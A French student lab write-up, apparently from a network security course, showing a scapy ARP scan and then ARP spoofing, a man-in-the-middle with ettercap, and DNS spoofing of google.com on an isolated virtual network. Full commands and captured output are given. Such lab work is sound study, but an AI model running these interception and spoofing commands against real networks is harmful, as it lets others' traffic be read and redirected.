## 1. Scan réseau

liste ip présentes sur le réseau passé en paramètre
````
from scapy.all import *

print("Choose in which network you want to scan")
ip_reseaux=input()
a=arping(ip_reseaux)
if ip_reseaux[7]=="0" and ip_reseaux[8]=="/" and ip_reseaux[9]+ip_reseaux[10]=="24":
        a
else:
        print("Error, wrong network")
        print("Network example : 192.168.1.0/24")
````

résultat sur le réseau 10.1.1.0/24
````
quentin@attacker:~/Documents$ sudo python3 test.py
Choose in which network you want to scan
10.1.1.0/24
Begin emission:
Finished sending 256 packets.
***
Received 3 packets, got 3 answers, remaining 253 packets
  0a:00:27:00:00:43 unknown 10.1.1.1
  08:00:27:72:6d:7b unknown 10.1.1.10
  08:00:27:2d:ea:7c unknown 10.1.1.254
````

IP attacker = 10.1.1.11/24, MAC attacker = 08:00:27:6f:b9:c3  
IP victim = 10.1.1.10/24, MAC victim = 08:00:27:72:6d:7b

## 2. ARP Poisoning et MITM
### A. ARP Spoof
Envoie un arp avec une fausse adresse IP qui est relier à la mac de l'attaquant
````
quentin@attacker:~$ sudo arping -i 1 -U -s 10.1.1.20 -I enp0s3 10.1.1.10
ARPING 10.1.1.10 from 10.1.1.20 enp0s3
Unicast reply from 10.1.1.10 [08:00:27:72:6D:7B]  0.715ms
Sent 1 probes (1 broadcast(s))
Received 1 response(s)
````
Modifications table arp de la victime
````
quentin@victim:~$ ip n s
10.1.1.20 dev enp0s3 lladdr 08:00:27:6f:b9:c3 STALE
10.1.1.254 dev enp0s3 lladdr 08:00:27:2d:ea:7c STALE
10.1.1.1 dev enp0s3 lladdr 0a:00:27:00:00:43 DELAY
````
Quand la victime ping la fausse addresse IP l'attaquant peut voir l'échange
````
quentin@victim:~$ ping 10.1.1.20
PING 10.1.1.20 (10.1.1.20) 56(84) bytes of data.
^C
--- 10.1.1.20 ping statistics ---
6 packets transmitted, 0 received, 100% packet loss, time 5102ms
````
Vu de l'attaquant
````
quentin@attacker:~/Documents$ sudo tcpdump -n -i enp0s3 -e 'arp or icmp'
[sudo] Mot de passe de quentin :
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on enp0s3, link-type EN10MB (Ethernet), snapshot length 262144 bytes
00:26:01.482356 08:00:27:6f:b9:c3 > ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 42: Request who-has 10.1.1.10 (ff:ff:ff:ff:ff:ff) tell 10.1.1.20, length 28  
00:26:01.482549 08:00:27:72:6d:7b > 08:00:27:6f:b9:c3, ethertype ARP (0x0806), length 60: Reply 10.1.1.10 is-at 08:00:27:72:6d:7b, length 46
00:26:51.895333 08:00:27:72:6d:7b > 08:00:27:6f:b9:c3, ethertype IPv4 (0x0800), length 98: 10.1.1.10 > 10.1.1.20: ICMP echo request, id 64808, seq 1, length 64
00:26:52.905237 08:00:27:72:6d:7b > 08:00:27:6f:b9:c3, ethertype IPv4 (0x0800), length 98: 10.1.1.10 > 10.1.1.20: ICMP echo request, id 64808, seq 2, length 64
00:26:57.097051 08:00:27:72:6d:7b > 08:00:27:6f:b9:c3, ethertype ARP (0x0806), length 60: Request who-has 10.1.1.20 tell 10.1.1.10, length 46
7 packets captured
````

### B. MITM

Spam en mettant son addresse mac pour l'ip de la victime sur la table arp du routeur et sa mac pour l'ip du routeur sur la table arp de la victime (je ne pouvais pas spécifier avec l'ip que pour le routeur et la victime parce que j'avais un problème de (///)).
````
quentin@attacker:~$ sudo ettercap -i enp0s3 -T -M arp

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
enp0s3 -> 08:00:27:6F:B9:C3
          10.1.1.11/255.255.255.0
          fe80::a00:27ff:fe6f:b9c3/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
/ |=>                                                 |  100.00 %
````

Ping de la victime vers le routeur, les packets sont bien reçus

````
quentin@victim:~$ ping 10.1.1.254
PING 10.1.1.254 (10.1.1.254) 56(84) bytes of data.
64 bytes from 10.1.1.254: icmp_seq=1 ttl=64 time=14.6 ms
64 bytes from 10.1.1.254: icmp_seq=2 ttl=64 time=12.7 ms
64 bytes from 10.1.1.254: icmp_seq=3 ttl=64 time=11.2 ms
64 bytes from 10.1.1.254: icmp_seq=4 ttl=64 time=9.93 ms
^C
--- 10.1.1.254 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 9.925/12.102/14.561/1.732 ms
````


Vu avec tcpdump: on voit que le request et le reply passe par l'attaquant et que l'attaquant le transfère vers le bon destinataire. 
````
quentin@attacker:~$ sudo tcpdump -n -i enp0s3 -e 'arp or icmp'
16:30:03.522777 08:00:27:72:6d:7b > 08:00:27:6f:b9:c3, ethertype IPv4 (0x0800), length 98: 10.1.1.10 > 10.1.1.254: ICMP echo request, id 58327, seq 1, length 64
16:30:03.528832 08:00:27:6f:b9:c3 > 08:00:27:2d:ea:7c, ethertype IPv4 (0x0800), length 98: 10.1.1.10 > 10.1.1.254: ICMP echo request, id 58327, seq 1, length 64
16:30:03.529375 08:00:27:2d:ea:7c > 08:00:27:6f:b9:c3, ethertype IPv4 (0x0800), length 98: 10.1.1.254 > 10.1.1.10: ICMP echo reply, id 58327, seq 1, length 64
16:30:03.536890 08:00:27:6f:b9:c3 > 08:00:27:72:6d:7b, ethertype IPv4 (0x0800), length 98: 10.1.1.254 > 10.1.1.10: ICMP echo reply, id 58327, seq 1, length 64
````

## 3. DNS Spoofing

````
quentin@attacker:~$ sudo ettercap -i enp0s3 -T -q -P dns_spoof -M arp:remote

Listening on:
enp0s3 -> 08:00:27:6F:B9:C3
          10.1.1.11/255.255.255.0
          fe80::a00:27ff:fe6f:b9c3/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

3 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...

Activating dns_spoof plugin...

dns_spoof: A [www.google.com] spoofed to [51.15.202.245] TTL [3600 s]
dns_spoof: A [www.google.com] spoofed to [51.15.202.245] TTL [3600 s]
````

````
sudo python3 arp.py 10.1.1.10 10.1.1.254
[sudo] Mot de passe de quentin :
.
Sent 1 packets.
.
````
````
sudo python3 dns.py -f dns-host -i enp0s3
[sudo] Mot de passe de quentin :
Spoofing DNS requests on enp0s3
Send google.com has 51.15.202.245 to 10.1.1.10
.
Sent 1 packets.
Send google.com has 51.15.202.245 to 10.1.1.10
.
Sent 1 packets.
````
````
quentin@attacker:~$ sudo tcpdump -n -i enp0s3 -e 'arp or icmp'
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on enp0s3, link-type EN10MB (Ethernet), snapshot length 262144 bytes
02:13:52.780522 08:00:27:6f:b9:c3 > 08:00:27:72:6d:7b, ethertype IPv4 (0x0800), length 98: 10.1.1.11 > 10.1.1.10: ICMP redirect 8.8.8.8 to host 10.1.1.254, length 64
02:13:52.791916 08:00:27:72:6d:7b > 08:00:27:6f:b9:c3, ethertype IPv4 (0x0800), length 98: 10.1.1.10 > 51.15.202.245: ICMP echo request, id 48551, seq 1, length 64
02:13:53.823216 08:00:27:72:6d:7b > 08:00:27:6f:b9:c3, ethertype IPv4 (0x0800), length 98: 10.1.1.10 > 51.15.202.245: ICMP echo request, id 48551, seq 2, length 64
02:13:53.823253 08:00:27:6f:b9:c3 > 08:00:27:72:6d:7b, ethertype IPv4 (0x0800), length 126: 10.1.1.11 > 10.1.1.10: ICMP redirect 51.15.202.245 to host 10.1.1.254, length 92
````

````
quentin@victim:~$ ping google.com
PING google.com (51.15.202.245) 56(84) bytes of data.
From 10.1.1.11: icmp_seq=2 Redirect Host(New nexthop: 10.1.1.254)

--- google.com ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1031ms
````